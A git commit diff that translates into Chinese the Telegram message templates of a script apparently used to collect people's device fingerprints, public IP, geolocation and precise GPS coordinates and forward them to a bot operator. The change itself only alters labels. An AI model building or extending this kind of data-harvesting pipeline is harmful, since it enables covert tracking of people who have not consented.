cdfb0cabd7b751c00a2c05dacd5c480d3a14049e
YangYiChen <42916413+skilfulwriter@users.noreply.github.com>
2025-12-08 09:12:19 +0800

    Translate device, IP, and location info to Chinese

--- telegram_api.py
+++ telegram_api.py
@@ -26,31 +26,31 @@ def tgram_sender(msg_type, content, token):
     json_content = loads(json_str)
     if msg_type == 'device_info':
         info_message = f"""
-*Device Information*
+*设备信息*
 
 ```
-OS         : {json_content['os']}
-Platform   : {json_content['platform']}
-Browser    : {json_content['browser']}
-GPU Vendor : {json_content['vendor']}
+操作系统   : {json_content['os']}
+平台       : {json_content['platform']}
+浏览器     : {json_content['browser']}
+GPU 供应商 : {json_content['vendor']}
 GPU        : {json_content['render']}
-CPU Cores  : {json_content['cores']}
-RAM        : {json_content['ram']}
-Public IP  : {json_content['ip']}
-Resolution : {json_content['ht']}x{json_content['wd']}
+CPU 核心   : {json_content['cores']}
+内存       : {json_content['ram']}
+公网 IP    : {json_content['ip']}
+分辨率     : {json_content['ht']}x{json_content['wd']}
 ```"""
         send_request(token, info_message)
 
     if msg_type == 'ip_info':
         ip_message = f"""
-*IP Information*
+*IP 信息*
 
 ```
-Continent : {json_content['continent']}
-Country   : {json_content['country']}
-Region    : {json_content['region']}
-City      : {json_content['city']}
-Org       : {json_content['org']}
+大洲      : {json_content['continent']}
+国家      : {json_content['country']}
+地区      : {json_content['region']}
+城市      : {json_content['city']}
+组织      : {json_content['org']}
 ISP       : {json_content['isp']}
 ```
 """
@@ -58,15 +58,15 @@ ISP       : {json_content['isp']}
 
     if msg_type == 'location':
         loc_message = f"""
-*Location Information*
+*位置信息*
 
 ```
-Latitude  : {json_content['lat']}
-Longitude : {json_content['lon']}
-Accuracy  : {json_content['acc']}
-Altitude  : {json_content['alt']}
-Direction : {json_content['dir']}
-Speed     : {json_content['spd']}
+纬度      : {json_content['lat']}
+经度      : {json_content['lon']}
+精度      : {json_content['acc']}
+海拔      : {json_content['alt']}
+方向      : {json_content['dir']}
+速度      : {json_content['spd']}
 ```
 """
         send_request(token, loc_message)
